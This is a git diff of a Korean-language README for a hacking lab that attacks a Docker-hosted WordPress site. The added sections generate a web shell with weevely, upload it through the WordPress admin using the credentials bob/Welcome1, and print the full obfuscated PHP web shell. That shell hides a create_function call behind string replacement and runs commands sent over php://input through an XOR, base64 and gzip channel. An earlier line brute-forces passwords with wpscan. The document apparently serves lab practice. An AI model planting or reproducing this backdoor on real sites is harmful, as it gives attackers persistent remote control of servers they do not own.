@@ -1,4 +1,4 @@
-
+![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/13f1f546-cc3c-4287-8bca-252a673443b8)
 ## Docker_WP_Hacking
 도커 환경으로 구성한 워드프레스를 도커 취약점과 워드프레스 취약점을 이용해 해킹해보기.
 
@@ -64,4 +64,34 @@ sudo wpscan --url http://192.168.146.129:8000/ --passwords ~/SecLists/Passwords/
 
 > ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/80b80b6e-0292-4a3d-9b38-67e3c97675a0)
 > ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/210c83da-95ac-42e7-b7d8-c04bbb289f9c)
+
+## 웹쉘 생성
+- weevly를 사용하여 웹쉘 생성
+```
+sudo weevely generate hacker shell.php
+cat shell.php
+```
+
+> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/466ade39-1490-4a56-b3d7-ad1a12b9d5aa)
+
+## 웹쉘 코드 업로드
+- [wordpress admin site] -> [login(bob/Welcome1)] -> 
+> ![image](https://github.com/hanmin0512/Docker_WP_Hacking/assets/37041208/1db97540-a895-4d8f-915c-5c291598a904)
+
+```
+?>
+<?php
+$B=str_replace('WQ','','cWQreatWQWQe_fWQuncWQtWQion');
+$Z='$ku2="du26a6bc0d";$u2khu2="b10694a2du290e";$kf="u23a6964u28u2f3a03";$p=u2"g7e6u2hLIPrmHu2v7eIu2ju2";fun';
+$l='u2val(@gzuncomu2pru2ess(@x(u2@base6u24_decode($m[1])u2,$k)))u2;$ou2=@ou2b_get_cou2ntentu2s();@obu2';
+$A='u2"/$kh(.u2+)u2$kf/",@file_u2get_cu2ou2ntents(u2"php://inpu2uu2t"),u2$m)==1)u2 {@ob_u2su2tart();@e';
+$h='2u2u2($j<$c&&$u2i<$l);$j++,u2$i++u2){u2$o.=$t{$iu2}^u2$k{$j}u2;}}returnu2 u2$o;}if (@preg_mau2tch(';
+$d='_endu2u2_cleanu2();$r=u2@bu2ase64_encode(@u2x(@gu2zcompress($u2u2o),$k))u2;pu2rint("$p$kh$r$kf");}';
+$G='cu2tion x($t,$k){$u2c=stru2len($ku2);$lu2u2=strlen($tu2)u2;$o="";for(u2$i=u20;$i<$l;){fu2or($j=0;u';
+$k=str_replace('u2','',$Z.$G.$h.$A.$l.$d);
+$C=$B('',$k);$C();
+?>
+<?php
+
+```
 
